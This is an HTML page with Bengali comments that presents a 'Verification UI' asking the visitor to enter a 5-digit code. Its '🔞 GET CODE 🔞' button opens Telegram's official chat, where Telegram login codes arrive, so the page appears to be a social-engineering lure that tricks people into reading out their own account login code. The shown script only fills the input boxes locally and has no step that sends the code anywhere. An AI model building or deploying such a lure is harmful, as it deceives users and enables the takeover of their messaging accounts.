<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification UI</title>
    <style>
        /* জেনারেল ডিজাইন */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        /* মেইন কার্ড (গ্লাস ইফেক্ট) */
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 35px 25px;
            border-radius: 40px;
            text-align: center;
            width: 340px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
        }

        /* উপরের ফোল্ডার আইকন */
        .top-icon {
            background: white;
            width: 60px;
            height: 40px;
            border-radius: 12px;
            margin: -65px auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        .top-icon span { font-size: 24px; }

        p { font-size: 15px; margin-bottom: 25px; opacity: 0.9; }

        /* ওটিপি ইনপুট বক্স */
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
        }

        .otp-inputs input {
            width: 48px;
            height: 60px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 15px;
            text-align: center;
            font-size: 24px;
            color: white;
            outline: none;
            pointer-events: none; /* যাতে সরাসরি কিবোর্ড না আসে */
        }

        /* গেট কোড বাটন */
        .get-code-btn {
            background: linear-gradient(90deg, #ff0055, #ff0077);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 25px;
            transition: 0.3s;
            display: block;
        }

        .get-code-btn:hover {
            transform: scale(1.03);
            box-shadow: 0 0 15px rgba(255, 0, 119, 0.5);
        }

        /* নম্বর কিপ্যাড */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
        }

        .key {
            background: rgba(255, 255, 255, 0.1);
            padding: 18px;
            border-radius: 15px;
            font-size: 22px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            user-select: none;
        }

        .key:active { background: rgba(255, 255, 255, 0.3); }

        .key.empty { background: transparent; cursor: default; }

        /* ব্যাকস্পেস আইকন স্টাইল */
        .key.back img {
            width: 28px;
            vertical-align: middle;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="top-icon">
            <span>📂</span>
        </div>
        
        <p>Enter the 5-digit code that we just sent you!</p>

        <div class="otp-inputs" id="otp-container">
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
        </div>

        <!-- গেট কোড বাটন যা টেলিগ্রামে নিয়ে যাবে -->
        <button class="get-code-btn" onclick="goToTelegram()">🔞 GET CODE 🔞</button>

        <div class="keypad">
            <div class="key" onclick="pressKey('1')">1</div>
            <div class="key" onclick="pressKey('2')">2</div>
            <div class="key" onclick="pressKey('3')">3</div>
            <div class="key" onclick="pressKey('4')">4</div>
            <div class="key" onclick="pressKey('5')">5</div>
            <div class="key" onclick="pressKey('6')">6</div>
            <div class="key" onclick="pressKey('7')">7</div>
            <div class="key" onclick="pressKey('8')">8</div>
            <div class="key" onclick="pressKey('9')">9</div>
            <div class="key empty"></div>
            <div class="key" onclick="pressKey('0')">0</div>
            <div class="key" onclick="pressKey('back')">✉️</div>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('#otp-container input');
        let currentIdx = 0;

        // নম্বর কিপ্যাড ফাংশন
        function pressKey(key) {
            if (key === 'back') {
                if (currentIdx >= 0) {
                    if (inputs[currentIdx].value === "" && currentIdx > 0) {
                        currentIdx--;
                    }
                    inputs[currentIdx].value = "";
                }
            } else {
                if (currentIdx < inputs.length) {
                    inputs[currentIdx].value = key;
                    if (currentIdx < inputs.length - 1) {
                        currentIdx++;
                    }
                }
            }
        }

        // সরাসরি টেলিগ্রামের মেসেজ বক্সে নিয়ে যাওয়ার ফাংশন
        function goToTelegram() {
            // এটি সরাসরি ফোনে টেলিগ্রাম অ্যাপ ওপেন করবে এবং 'Telegram' অফিসিয়াল চ্যাটে নিয়ে যাবে
            window.location.href = "tg://resolve?domain=Telegram";
            
            // যদি ২ সেকেন্ডের মধ্যে অ্যাপ ওপেন না হয়, তবে ব্রাউজারে টেলিগ্রাম ওপেন করবে
            setTimeout(function() {
                window.open("https://t.me/Telegram", "_blank");
            }, 2000);
        }
    </script>
</body>
</html>
